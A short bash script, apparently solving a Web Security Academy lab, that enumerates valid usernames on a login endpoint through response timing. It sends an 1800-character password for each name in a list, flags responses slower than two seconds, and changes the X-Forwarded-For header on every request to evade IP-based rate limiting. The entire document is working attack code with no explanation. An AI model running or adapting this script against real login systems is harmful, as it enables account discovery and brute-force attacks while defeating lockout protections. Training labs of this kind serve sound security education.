#!/usr/bin/env bash

i=1
HOST="0ad300f5030dd2ae81c0d5e200a40063.web-security-academy.net"
PASS="$(printf 'A%.0s' {1..1800})"

while IFS= read -r username; do
  time_taken=$(
    curl -s -o /dev/null -w "%{time_total}" \
      -X POST "https://$HOST/login" \
      -H "X-Forwarded-For: 127.0.1.$i" \
      --data-urlencode "username=$username" \
      --data-urlencode "password=$PASS"
  )

  if awk "BEGIN {exit !($time_taken > 2)}"; then
    echo "[+] Possible valid username: $username | Time: $time_taken"
  fi
  i=$((i+1))
done < user_list.txt
